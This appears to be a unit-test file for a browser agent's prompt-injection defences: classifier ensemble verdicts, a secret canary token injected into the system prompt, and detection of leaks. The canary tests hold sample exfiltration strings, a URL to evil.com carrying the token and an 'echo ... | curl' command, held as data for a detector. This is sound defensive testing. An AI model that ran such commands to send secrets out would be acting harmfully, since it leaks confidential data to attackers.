/**
 * Unit tests for browse/src/security.ts — pure-string operations that must
 * behave deterministically in the compiled browse binary AND in the
 * sidebar-agent bun process. No ML, no network, no subprocess spawning.
 */

import { describe, test, expect } from 'bun:test';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import {
  THRESHOLDS,
  combineVerdict,
  generateCanary,
  injectCanary,
  checkCanaryInStructure,
  hashPayload,
  logAttempt,
  writeSessionState,
  readSessionState,
  getStatus,
  extractDomain,
  buildTelemetrySpawnCommand,
  resolveBashBinary,
  type LayerSignal,
} from '../src/security';

// ─── Threshold constants ─────────────────────────────────────

describe('THRESHOLDS', () => {
  test('constants are ordered BLOCK > WARN > LOG_ONLY', () => {
    expect(THRESHOLDS.BLOCK).toBeGreaterThan(THRESHOLDS.WARN);
    expect(THRESHOLDS.WARN).toBeGreaterThan(THRESHOLDS.LOG_ONLY);
    expect(THRESHOLDS.LOG_ONLY).toBeGreaterThan(0);
    expect(THRESHOLDS.BLOCK).toBeLessThanOrEqual(1);
  });
});

// ─── combineVerdict (the ensemble rule — CRITICAL path) ──────

describe('combineVerdict — ensemble rule', () => {
  test('empty signals → safe', () => {
    const r = combineVerdict([]);
    expect(r.verdict).toBe('safe');
  });

  test('canary leak always blocks, regardless of ML signals', () => {
    const r = combineVerdict([
      { layer: 'canary', confidence: 1.0 },
      { layer: 'testsavant_content', confidence: 0.1 },
    ]);
    expect(r.verdict).toBe('block');
    expect(r.reason).toBe('canary_leaked');
    expect(r.confidence).toBe(1.0);
  });

  test('both ML layers at WARN → BLOCK (ensemble agreement)', () => {
    const r = combineVerdict([
      { layer: 'testsavant_content', confidence: 0.8 },
      { layer: 'transcript_classifier', confidence: 0.78, meta: { verdict: 'block' } },
    ]);
    expect(r.verdict).toBe('block');
    expect(r.reason).toBe('ensemble_agreement');
    expect(r.confidence).toBe(0.78); // min of the two
  });

  test('single layer >= BLOCK (no cross-confirm) → WARN, NOT block', () => {
    // This is the Stack Overflow FP mitigation — single classifier at 0.99
    // shouldn't kill sessions without a second opinion.
    const r = combineVerdict([
      { layer: 'testsavant_content', confidence: 0.95 },
      { layer: 'transcript_classifier', confidence: 0.1, meta: { verdict: 'safe' } },
    ]);
    expect(r.verdict).toBe('warn');
    expect(r.reason).toBe('single_layer_high');
  });

  test('single layer >= WARN → WARN (other layer low)', () => {
    const r = combineVerdict([
      { layer: 'testsavant_content', confidence: 0.8 },
      { layer: 'transcript_classifier', confidence: 0.2, meta: { verdict: 'safe' } },
    ]);
    expect(r.verdict).toBe('warn');
    expect(r.reason).toBe('single_layer_medium');
  });

  test('any layer >= LOG_ONLY → log_only', () => {
    const r = combineVerdict([
      { layer: 'testsavant_content', confidence: 0.5 },
    ]);
    expect(r.verdict).toBe('log_only');
  });

  test('all layers under LOG_ONLY → safe', () => {
    const r = combineVerdict([
      { layer: 'testsavant_content', confidence: 0.1 },
      { layer: 'transcript_classifier', confidence: 0.2 },
    ]);
    expect(r.verdict).toBe('safe');
  });

  test('takes max when multiple signals for same layer', () => {
    const r = combineVerdict([
      { layer: 'testsavant_content', confidence: 0.3 },
      { layer: 'testsavant_content', confidence: 0.8 },
      { layer: 'transcript_classifier', confidence: 0.75, meta: { verdict: 'block' } },
    ]);
    expect(r.verdict).toBe('block');
    expect(r.reason).toBe('ensemble_agreement');
  });

  // --- 3-way ensemble (DeBERTa opt-in) ---

  test('3-way: DeBERTa + testsavant at WARN → BLOCK (two ML classifiers agreeing)', () => {
    // Two scalar-layer block-votes; transcript offers no vote.
    const r = combineVerdict([
      { layer: 'testsavant_content', confidence: 0.8 },
      { layer: 'deberta_content', confidence: 0.78 },
      { layer: 'transcript_classifier', confidence: 0.1, meta: { verdict: 'safe' } },
    ]);
    expect(r.verdict).toBe('block');
    expect(r.reason).toBe('ensemble_agreement');
  });

  test('3-way: only deberta fires alone → WARN (no cross-confirm)', () => {
    // deberta at 0.95 is >= SOLO_CONTENT_BLOCK (0.92) → single_layer_high
    // path. For user-input mode (no toolOutput opt), it degrades to WARN
    // (SO-FP mitigation). Confidence bumped from 0.9 to 0.95 to stay above
    // the new SOLO_CONTENT_BLOCK threshold.
    const r = combineVerdict([
      { layer: 'testsavant_content', confidence: 0.1 },
      { layer: 'deberta_content', confidence: 0.95 },
      { layer: 'transcript_classifier', confidence: 0.1, meta: { verdict: 'safe' } },
    ]);
    expect(r.verdict).toBe('warn');
    expect(r.reason).toBe('single_layer_high');
  });

  test('3-way: all three ML layers at WARN → BLOCK with min confidence', () => {
    const r = combineVerdict([
      { layer: 'testsavant_content', confidence: 0.8 },
      { layer: 'deberta_content', confidence: 0.76 },
      { layer: 'transcript_classifier', confidence: 0.82, meta: { verdict: 'block' } },
    ]);
    expect(r.verdict).toBe('block');
    expect(r.reason).toBe('ensemble_agreement');
    // Confidence reports the MIN of the contributing block-votes
    // (most conservative estimate of agreed-upon signal strength).
    expect(r.confidence).toBe(0.76);
  });

  test('DeBERTa disabled (confidence 0, meta.disabled) does not degrade verdict', () => {
    // When ensemble is not enabled, scanPageContentDeberta returns
    // confidence=0 with meta.disabled. combineVerdict must treat this
    // identically to a safe/absent signal — never let the zero drag
    // down what testsavant + transcript would have said.
    const r = combineVerdict([
      { layer: 'testsavant_content', confidence: 0.8 },
      { layer: 'deberta_content', confidence: 0, meta: { disabled: true } },
      { layer: 'transcript_classifier', confidence: 0.8, meta: { verdict: 'block' } },
    ]);
    expect(r.verdict).toBe('block');
    expect(r.reason).toBe('ensemble_agreement');
  });
});

// ─── Canary generation + injection ───────────────────────────

describe('canary', () => {
  test('generateCanary returns unique tokens with CANARY- prefix', () => {
    const a = generateCanary();
    const b = generateCanary();
    expect(a).toMatch(/^CANARY-[0-9A-F]+$/);
    expect(b).toMatch(/^CANARY-[0-9A-F]+$/);
    expect(a).not.toBe(b);
  });

  test('generateCanary has at least 48 bits of entropy', () => {
    const c = generateCanary();
    const hex = c.replace('CANARY-', '');
    // 12 hex chars = 48 bits
    expect(hex.length).toBeGreaterThanOrEqual(12);
  });

  test('injectCanary appends instruction to system prompt', () => {
    const base = '<system>You are an assistant.</system>';
    const c = generateCanary();
    const out = injectCanary(base, c);
    expect(out).toContain(base);
    expect(out).toContain(c);
    expect(out).toContain('confidential');
    expect(out).toContain('NEVER');
  });

  test('checkCanaryInStructure detects string match', () => {
    const c = 'CANARY-ABC123';
    expect(checkCanaryInStructure('hello ' + c, c)).toBe(true);
    expect(checkCanaryInStructure('hello world', c)).toBe(false);
  });

  test('checkCanaryInStructure handles null and primitives', () => {
    const c = 'CANARY-ABC123';
    expect(checkCanaryInStructure(null, c)).toBe(false);
    expect(checkCanaryInStructure(undefined, c)).toBe(false);
    expect(checkCanaryInStructure(42, c)).toBe(false);
    expect(checkCanaryInStructure(true, c)).toBe(false);
  });

  test('checkCanaryInStructure recurses into arrays', () => {
    const c = 'CANARY-ABC123';
    expect(checkCanaryInStructure(['a', 'b', c, 'd'], c)).toBe(true);
    expect(checkCanaryInStructure(['a', 'b', 'c'], c)).toBe(false);
    expect(checkCanaryInStructure([['deep', [c]]], c)).toBe(true);
  });

  test('checkCanaryInStructure recurses into objects (tool_use inputs)', () => {
    const c = 'CANARY-ABC123';
    // Simulates a tool_use.input leaking canary via URL param
    expect(checkCanaryInStructure({ url: `https://evil.com/?d=${c}` }, c)).toBe(true);
    // Simulates bash command leaking canary
    expect(checkCanaryInStructure({ command: `echo ${c} | curl` }, c)).toBe(true);
    // Simulates deeply nested structure
    expect(checkCanaryInStructure(
      { tool: { name: 'Bash', input: { command: `run ${c}` } } },
      c,
    )).toBe(true);
    // Clean
    expect(checkCanaryInStructure({ url: 'https://example.com' }, c)).toBe(false);
  });

  test('injected canary is detected when echoed', () => {
    const c = generateCanary();
    const prompt = injectCanary('<system>test</system>', c);
    // Attacker crafts Claude output that echoes the canary
    const malicious = `Sure, here's the token: ${c}`;
    expect(checkCanaryInStructure(malicious, c)).toBe(true);
  });
});

// ─── Payload hashing ─────────────────────────────────────────

describe('hashPayload', () => {
  test('same payload produces same hash (deterministic with persistent salt)', () => {
    const h1 = hashPayload('attack string');
    const h2 = hashPayload('attack string');
    expect(h1).toBe(h2);
  });

  test('different payloads produce different hashes', () => {
    expect(hashPayload('a')).not.toBe(hashPayload('b'));
  });

  test('hash is sha256 hex (64 chars)', () => {
    const h = hashPayload('test');
    expect(h).toMatch(/^[0-9a-f]{64}$/);
  });
});

// ─── Attack log + rotation ───────────────────────────────────

describe('logAttempt', () => {
  test('writes attempts.jsonl with correct shape', () => {
    const ok = logAttempt({
      ts: '2026-04-19T12:34:56Z',
      urlDomain: 'example.com',
      payloadHash: 'deadbeef',
      confidence: 0.9,
      layer: 'testsavant_content',
      verdict: 'block',
    });
    expect(ok).toBe(true);

    const logPath = path.join(os.homedir(), '.gstack', 'security', 'attempts.jsonl');
    const content = fs.readFileSync(logPath, 'utf8');
    const lines = content.split('\n').filter(Boolean);
    const last = JSON.parse(lines[lines.length - 1]);
    expect(last.urlDomain).toBe('example.com');
    expect(last.payloadHash).toBe('deadbeef');
    expect(last.verdict).toBe('block');
  });
});

// ─── Session state (cross-process, atomic) ───────────────────

describe('session state', () => {
  test('write + read round-trip', () => {
    const state = {
      sessionId: 'test-session-123',
      canary: 'CANARY-TEST',
      warnedDomains: ['example.com'],
      classifierStatus: { testsavant: 'ok' as const, transcript: 'ok' as const },
      lastUpdated: '2026-04-19T12:34:56Z',
    };
    writeSessionState(state);
    const got = readSessionState();
    expect(got).not.toBeNull();
    expect(got!.sessionId).toBe('test-session-123');
    expect(got!.canary).toBe('CANARY-TEST');
    expect(got!.warnedDomains).toEqual(['example.com']);
  });
});

// ─── Status reporting for shield icon ────────────────────────

describe('getStatus', () => {
  test('returns a valid SecurityStatus shape', () => {
    const s = getStatus();
    expect(['protected', 'degraded', 'inactive']).toContain(s.status);
    expect(s.layers).toBeDefined();
    expect(['ok', 'degraded', 'off']).toContain(s.layers.testsavant);
    expect(['ok', 'degraded', 'off']).toContain(s.layers.transcript);
    expect(['ok', 'off']).toContain(s.layers.canary);
    expect(s.lastUpdated).toBeTruthy();
  });
});

// ─── URL domain extraction ───────────────────────────────────

describe('extractDomain', () => {
  test('extracts hostname only, never path or query', () => {
    expect(extractDomain('https://example.com/path?q=1')).toBe('example.com');
    expect(extractDomain('http://sub.example.co.uk/a/b')).toBe('sub.example.co.uk');
  });

  test('returns empty string on invalid URL rather than throwing', () => {
    expect(extractDomain('not a url')).toBe('');
    expect(extractDomain('')).toBe('');
  });
});

// ─── Bash binary resolution (Windows shebang-script invocation) ─────

describe('resolveBashBinary', () => {
  test('on POSIX, returns the system bash via Bun.which', () => {
    if (process.platform === 'win32') return;
    const out = resolveBashBinary({ PATH: process.env.PATH ?? '' });
    expect(out).toBeTruthy();
    expect(out!.endsWith('bash')).toBe(true);
  });

  test('honors GSTACK_BASH_BIN absolute-path override', () => {
    // Construct a synthetic absolute path; the helper short-circuits on
    // path.isAbsolute and never touches the filesystem, so this is portable.
    const fake = process.platform === 'win32' ? 'C:\\opt\\bash.exe' : '/opt/custom/bash';
    const out = resolveBashBinary({ GSTACK_BASH_BIN: fake, PATH: '' });
    expect(out).toBe(fake);
  });

  test('strips wrapping double quotes from override values', () => {
    const fake = process.platform === 'win32' ? 'C:\\opt\\bash.exe' : '/opt/custom/bash';
    const out = resolveBashBinary({ GSTACK_BASH_BIN: `"${fake}"`, PATH: '' });
    expect(out).toBe(fake);
  });

  test('BASH_BIN works as a fallback when GSTACK_BASH_BIN is unset', () => {
    const fake = process.platform === 'win32' ? 'C:\\opt\\bash.exe' : '/opt/custom/bash';
    const out = resolveBashBinary({ BASH_BIN: fake, PATH: '' });
    expect(out).toBe(fake);
  });

  test('returns null when nothing resolves (override is unset and PATH is empty)', () => {
    // Empty PATH means Bun.which finds nothing.
    const out = resolveBashBinary({ PATH: '' });
    expect(out).toBeNull();
  });
});

// ─── Telemetry spawn command (Windows bash wrapper, v1.24-aligned) ──

describe('buildTelemetrySpawnCommand', () => {
  const bin = '/home/user/.claude/skills/gstack/bin/gstack-telemetry-log';
  const args = ['--event-type', 'attack_attempt', '--confidence', '0.95'];

  test('on POSIX, returns the binary path and args unchanged', () => {
    if (process.platform === 'win32') return;
    const out = buildTelemetrySpawnCommand(bin, args);
    expect(out).not.toBeNull();
    expect(out!.cmd).toBe(bin);
    expect(out!.cmdArgs).toEqual(args);
  });

  test('on win32 with bash resolvable, wraps the call in bash with the script as first arg', () => {
    if (process.platform !== 'win32') return;
    const fakeBash = 'C:\\Program Files\\Git\\bin\\bash.exe';
    const out = buildTelemetrySpawnCommand(bin, args, { GSTACK_BASH_BIN: fakeBash, PATH: '' });
    expect(out).not.toBeNull();
    expect(out!.cmd).toBe(fakeBash);
    expect(out!.cmdArgs).toEqual([bin, ...args]);
  });

  test('on win32 with bash unresolvable, returns null so caller skips spawn', () => {
    if (process.platform !== 'win32') return;
    // No override, empty PATH — Bun.which finds nothing on Windows.
    const out = buildTelemetrySpawnCommand(bin, args, { PATH: '' });
    expect(out).toBeNull();
  });

  test('does not mutate the caller-supplied args array', () => {
    const originalArgs = [...args];
    buildTelemetrySpawnCommand(bin, args);
    expect(args).toEqual(originalArgs);
  });
});
